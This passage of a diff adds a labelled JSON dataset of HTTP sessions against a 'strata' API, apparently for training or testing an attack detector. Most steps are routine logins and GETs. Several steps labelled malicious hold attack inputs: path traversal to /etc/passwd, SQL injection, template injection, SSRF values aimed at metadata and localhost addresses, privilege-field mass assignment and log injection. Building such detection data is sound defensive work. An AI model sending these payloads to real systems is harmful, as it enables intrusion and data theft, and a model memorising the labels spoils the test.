+    ]
+  },
+  {
+    "session_id": "sess122",
+    "client_ip": "192.0.2.31",
+    "steps": [
+      {
+        "id": "sess122-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "elad",
+          "password": "secretpassword22"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess122-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token122"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess122-s03",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/strata/stratum-8888",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token122"
+        },
+        "body": null,
+        "note": "Data error: relabeled from malicious. One authenticated GET. Words in the id are not evidence the object belongs to someone else."
+      },
+      {
+        "id": "sess122-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-2201",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token122"
+        },
+        "body": null,
+        "note": "The user opens a valid owned stratum object."
+      },
+      {
+        "id": "sess122-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-2202",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token122"
+        },
+        "body": null,
+        "note": "The user returns to another previously used stratum object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess123",
+    "client_ip": "192.0.2.32",
+    "steps": [
+      {
+        "id": "sess123-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "yael",
+          "password": "secretpassword23"
+        },
+        "note": "The user authenticates."
+      },
+      {
+        "id": "sess123-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token123"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess123-s03",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {
+          "status": "active"
+        },
+        "headers": {
+          "Authorization": "Bearer token123",
+          "User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6"
+        },
+        "body": null,
+        "note": "The client uses an old browser user-agent header."
+      },
+      {
+        "id": "sess123-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-2301",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token123"
+        },
+        "body": null,
+        "note": "The user opens a stratum object."
+      },
+      {
+        "id": "sess123-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-2302",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token123"
+        },
+        "body": null,
+        "note": "The user returns to another previously used stratum object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess124",
+    "client_ip": "192.0.2.33",
+    "steps": [
+      {
+        "id": "sess124-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "gil",
+          "password": "secretpassword24"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess124-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token124"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess124-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-2401",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token124"
+        },
+        "body": null,
+        "note": "The user opens stratum 2401."
+      },
+      {
+        "id": "sess124-s04",
+        "label": "malicious",
+        "method": "PATCH",
+        "path": "/strata/stratum-2401",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token124",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "layerDepth": 2.0,
+          "soilConsistency": "sandy",
+          "privileges": "superuser"
+        },
+        "note": "The update body includes a privilege field that is not in the contract."
+      },
+      {
+        "id": "sess124-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-2402",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token124"
+        },
+        "body": null,
+        "note": "The user returns to another previously used stratum object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess125",
+    "client_ip": "192.0.2.34",
+    "steps": [
+      {
+        "id": "sess125-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "adi",
+          "password": "secretpassword25"
+        },
+        "note": "The user authenticates."
+      },
+      {
+        "id": "sess125-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token125"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess125-s03",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/strata/../../etc/passwd",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token125"
+        },
+        "body": null,
+        "note": "The client attempts directory traversal in the resource path."
+      },
+      {
+        "id": "sess125-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-2501",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token125"
+        },
+        "body": null,
+        "note": "The user opens a legitimate stratum object."
+      },
+      {
+        "id": "sess125-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-2502",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token125"
+        },
+        "body": null,
+        "note": "The user returns to another previously used stratum object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess126",
+    "client_ip": "192.0.2.35",
+    "steps": [
+      {
+        "id": "sess126-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "chen",
+          "password": "secretpassword26"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess126-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token126"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess126-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-2601",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token126"
+        },
+        "body": null,
+        "note": "The user opens stratum 2601."
+      },
+      {
+        "id": "sess126-s04",
+        "label": "suspicious_benign",
+        "method": "PATCH",
+        "path": "/strata/stratum-2601",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token126",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "layerDepth": 1.4,
+          "soilConsistency": "silt's texture is fine"
+        },
+        "note": "The update contains an apostrophe in descriptive text."
+      },
+      {
+        "id": "sess126-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-2602",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token126"
+        },
+        "body": null,
+        "note": "The user returns to another previously used stratum object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess127",
+    "client_ip": "192.0.2.36",
+    "steps": [
+      {
+        "id": "sess127-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "oded",
+          "password": "secretpassword27"
+        },
+        "note": "The user authenticates."
+      },
+      {
+        "id": "sess127-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token127"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess127-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-2701",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token127"
+        },
+        "body": null,
+        "note": "The user opens stratum 2701."
+      },
+      {
+        "id": "sess127-s04",
+        "label": "malicious",
+        "method": "PATCH",
+        "path": "/strata/stratum-2701",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token127",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "layerDepth": 2.2,
+          "soilConsistency": "{{config.items()}}"
+        },
+        "note": "The update body includes a template expression."
+      },
+      {
+        "id": "sess127-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-2702",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token127"
+        },
+        "body": null,
+        "note": "The user returns to another previously used stratum object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess128",
+    "client_ip": "192.0.2.37",
+    "steps": [
+      {
+        "id": "sess128-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "dor",
+          "password": "secretpassword28"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess128-s02",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/trench-sites",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token128",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
+        },
+        "body": null,
+        "note": "The client uses an old browser user-agent header."
+      },
+      {
+        "id": "sess128-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token128"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess128-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-2801",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token128"
+        },
+        "body": null,
+        "note": "The user opens a stratum object."
+      },
+      {
+        "id": "sess128-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-2802",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token128"
+        },
+        "body": null,
+        "note": "The user returns to another previously used stratum object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess129",
+    "client_ip": "192.0.2.38",
+    "steps": [
+      {
+        "id": "sess129-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "tal",
+          "password": "secretpassword29"
+        },
+        "note": "The user authenticates."
+      },
+      {
+        "id": "sess129-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token129"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess129-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token129",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "siteId": "site-1",
+          "unitName": "Test",
+          "layerDepth": 1.0,
+          "internalIP": "http://169.254.169.254/latest/meta-data/"
+        },
+        "note": "The stratum creation body includes an internal address value."
+      },
+      {
+        "id": "sess129-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-2901",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token129"
+        },
+        "body": null,
+        "note": "The user opens a stratum object."
+      },
+      {
+        "id": "sess129-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-2902",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token129"
+        },
+        "body": null,
+        "note": "The user returns to another previously used stratum object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess130",
+    "client_ip": "192.0.2.39",
+    "steps": [
+      {
+        "id": "sess130-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "eran",
+          "password": "secretpassword30"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess130-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token130"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess130-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-3001",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token130"
+        },
+        "body": null,
+        "note": "The user opens stratum 3001."
+      },
+      {
+        "id": "sess130-s04",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/strata/stratum-3001/artifacts",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token130",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "artifactType": "coin",
+          "material": "silver\n2026-10-28 11:07:00 [AUDIT] Privilege escalation detected"
+        },
+        "note": "The artifact addition payload includes a newline plus a log stamp."
+      },
+      {
+        "id": "sess130-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-3002",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token130"
+        },
+        "body": null,
+        "note": "The user returns to another previously used stratum object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess131",
+    "client_ip": "192.0.2.40",
+    "steps": [
+      {
+        "id": "sess131-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "mor",
+          "password": "secretpassword31"
+        },
+        "note": "The user authenticates."
+      },
+      {
+        "id": "sess131-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token131"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess131-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-3101",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token131"
+        },
+        "body": null,
+        "note": "The user opens stratum 3101."
+      },
+      {
+        "id": "sess131-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-3102",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token131"
+        },
+        "body": null,
+        "note": "The user returns to another previously used stratum object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess132",
+    "client_ip": "192.0.2.41",
+    "steps": [
+      {
+        "id": "sess132-s01",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "omer",
+          "password": "secretpassword32",
+          "hint": "Remember to check password complexity."
+        },
+        "note": "The request body contains a harmless extra field."
+      },
+      {
+        "id": "sess132-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token132"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess132-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-3201",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token132"
+        },
+        "body": null,
+        "note": "The user opens a stratum object."
+      },
+      {
+        "id": "sess132-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-3202",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token132"
+        },
+        "body": null,
+        "note": "The user returns to another previously used stratum object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess133",
+    "client_ip": "192.0.2.42",
+    "steps": [
+      {
+        "id": "sess133-s01",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "admin' OR 1=1--",
+          "password": "x"
+        },
+        "note": "The first step attempts query injection in the authentication body."
+      },
+      {
+        "id": "sess133-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "shai",
+          "password": "secretpassword33"
+        },
+        "note": "The user logs in with valid credentials after the attempt."
+      },
+      {
+        "id": "sess133-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token133"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess133-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-3301",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token133"
+        },
+        "body": null,
+        "note": "The user opens a stratum object."
+      },
+      {
+        "id": "sess133-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-3302",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token133"
+        },
+        "body": null,
+        "note": "The user returns to another previously used stratum object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess134",
+    "client_ip": "192.0.2.43",
+    "steps": [
+      {
+        "id": "sess134-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "yaara",
+          "password": "secretpassword34"
+        },
+        "note": "The user authenticates."
+      },
+      {
+        "id": "sess134-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token134"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess134-s03",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/strata/stratum-3401",
+        "query": {
+          "debug": "false\n"
+        },
+        "headers": {
+          "Authorization": "Bearer token134"
+        },
+        "body": null,
+        "note": "The query parameter contains a newline that continues a sentence."
+      },
+      {
+        "id": "sess134-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-3402",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token134"
+        },
+        "body": null,
+        "note": "The user returns to another previously used stratum object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess135",
+    "client_ip": "192.0.2.44",
+    "steps": [
+      {
+        "id": "sess135-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "adi",
+          "password": "secretpassword35"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess135-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token135"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess135-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-3501",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token135"
+        },
+        "body": null,
+        "note": "The user opens stratum 3501."
+      },
+      {
+        "id": "sess135-s04",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/admin/users",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token135"
+        },
+        "body": null,
+        "note": "The user accesses an admin path not in the contract."
+      },
+      {
+        "id": "sess135-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-3502",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token135"
+        },
+        "body": null,
+        "note": "The user returns to another previously used stratum object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess136",
+    "client_ip": "192.0.2.45",
+    "steps": [
+      {
+        "id": "sess136-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "nadav",
+          "password": "secretpassword36"
+        },
+        "note": "The user authenticates."
+      },
+      {
+        "id": "sess136-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token136"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess136-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-3601",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token136"
+        },
+        "body": null,
+        "note": "The user opens stratum 3601."
+      },
+      {
+        "id": "sess136-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-3602",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token136"
+        },
+        "body": null,
+        "note": "The user returns to stratum 3602."
+      }
+    ]
+  },
+  {
+    "session_id": "sess137",
+    "client_ip": "192.0.2.46",
+    "steps": [
+      {
+        "id": "sess137-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "daniel",
+          "password": "secretpassword37"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess137-s02",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/trench-sites",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token137",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2)"
+        },
+        "body": null,
+        "note": "The request uses an old browser user-agent header."
+      },
+      {
+        "id": "sess137-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token137"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess137-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-3701",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token137"
+        },
+        "body": null,
+        "note": "The user opens a stratum object."
+      },
+      {
+        "id": "sess137-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-3702",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token137"
+        },
+        "body": null,
+        "note": "The user returns to another previously used stratum object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess138",
+    "client_ip": "192.0.2.47",
+    "steps": [
+      {
+        "id": "sess138-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "eden",
+          "password": "secretpassword38"
+        },
+        "note": "The user authenticates."
+      },
+      {
+        "id": "sess138-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token138"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess138-s03",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/artifacts/artifact-7777",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token138"
+        },
+        "body": null,
+        "note": "Data error: relabeled from malicious. One authenticated GET. Words in the id are not evidence the object belongs to someone else."
+      },
+      {
+        "id": "sess138-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/artifacts/artifact-3801",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token138"
+        },
+        "body": null,
+        "note": "The user views their own artifact."
+      },
+      {
+        "id": "sess138-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/artifacts/artifact-3802",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token138"
+        },
+        "body": null,
+        "note": "The user returns to another previously used artifact object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess139",
+    "client_ip": "192.0.2.48",
+    "steps": [
+      {
+        "id": "sess139-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "ofir",
+          "password": "secretpassword39"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess139-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token139"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess139-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-3901",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token139"
+        },
+        "body": null,
+        "note": "The user opens stratum 3901."
+      },
+      {
+        "id": "sess139-s04",
+        "label": "malicious",
+        "method": "PATCH",
+        "path": "/strata/stratum-3901",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token139",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "layerDepth": 2.5,
+          "soilConsistency": "clay",
+          "isAdmin": true
+        },
+        "note": "The update body includes a privilege field not in the contract."
+      },
+      {
+        "id": "sess139-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-3902",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token139"
+        },
+        "body": null,
+        "note": "The user returns to another previously used stratum object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess140",
+    "client_ip": "192.0.2.49",
+    "steps": [
+      {
+        "id": "sess140-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "bar",
+          "password": "secretpassword40"
+        },
+        "note": "The user authenticates."
+      },
+      {
+        "id": "sess140-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token140"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess140-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-4001",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token140"
+        },
+        "body": null,
+        "note": "The user opens stratum 4001."
+      },
+      {
+        "id": "sess140-s04",
+        "label": "suspicious_benign",
+        "method": "PATCH",
+        "path": "/strata/stratum-4001",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token140",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "layerDepth": 1.9,
+          "soilConsistency": "firm\n structure"
+        },
+        "note": "The update contains a newline that continues a sentence."
+      },
+      {
+        "id": "sess140-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-4002",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token140"
+        },
+        "body": null,
+        "note": "The user returns to another previously used stratum object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess141",
+    "client_ip": "192.0.2.50",
+    "steps": [
+      {
+        "id": "sess141-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "inbar",
+          "password": "secretpassword41"
+        },
+        "note": "The user authenticates."
+      },
+      {
+        "id": "sess141-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token141"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess141-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-4101",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token141"
+        },
+        "body": null,
+        "note": "The user opens stratum 4101."
+      },
+      {
+        "id": "sess141-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-4102",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token141"
+        },
+        "body": null,
+        "note": "The user returns to stratum 4102."
+      }
+    ]
+  },
+  {
+    "session_id": "sess142",
+    "client_ip": "192.0.2.51",
+    "steps": [
+      {
+        "id": "sess142-s01",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "lior",
+          "password": "secretpassword42",
+          "token": "Session token generated."
+        },
+        "note": "The request body contains a harmless extra field."
+      },
+      {
+        "id": "sess142-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token142"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess142-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-4201",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token142"
+        },
+        "body": null,
+        "note": "The user opens stratum 4201."
+      },
+      {
+        "id": "sess142-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-4202",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token142"
+        },
+        "body": null,
+        "note": "The user returns to stratum 4202."
+      }
+    ]
+  },
+  {
+    "session_id": "sess143",
+    "client_ip": "192.0.2.52",
+    "steps": [
+      {
+        "id": "sess143-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "stav",
+          "password": "secretpassword43"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess143-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token143"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess143-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token143",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "siteId": "site-1",
+          "unitName": "Test",
+          "layerDepth": 1.0,
+          "internalUrl": "http://127.0.0.1/admin"
+        },
+        "note": "The stratum creation body includes an internal address value."
+      },
+      {
+        "id": "sess143-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-4301",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token143"
+        },
+        "body": null,
+        "note": "The user opens stratum 4301."
+      },
+      {
+        "id": "sess143-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-4302",
+        "query": {},
+        "headers": {
